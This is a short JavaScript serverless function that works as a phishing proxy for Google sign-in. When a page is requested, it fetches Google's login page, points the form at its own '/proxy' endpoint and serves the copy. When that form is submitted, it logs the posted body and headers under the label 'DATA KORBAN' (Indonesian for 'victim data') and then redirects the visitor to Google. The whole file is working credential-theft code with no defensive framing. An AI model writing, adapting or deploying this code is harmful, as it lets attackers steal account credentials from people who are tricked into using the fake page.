exports.handler = async (event) => {
  if (event.httpMethod === "POST") {
    const body = event.body;
    const headers = event.headers;
    
    console.log("DATA KORBAN:", body);
    console.log("HEADERS:", headers);
    
    return {
      statusCode: 302,
      headers: {
        "Location": "https://accounts.google.com"
      },
      body: ""
    };
  }
  
  const target = "https://accounts.google.com/login";
  
  const res = await fetch(target, {
    headers: {
      "User-Agent": event.headers["user-agent"]
    }
  });
  
  let html = await res.text();
  
  html = html.replace(/action="[^"]*"/, `action="/proxy"`);
  
  return {
    statusCode: 200,
    headers: { "content-type": "text/html" },
    body: html
  };
};
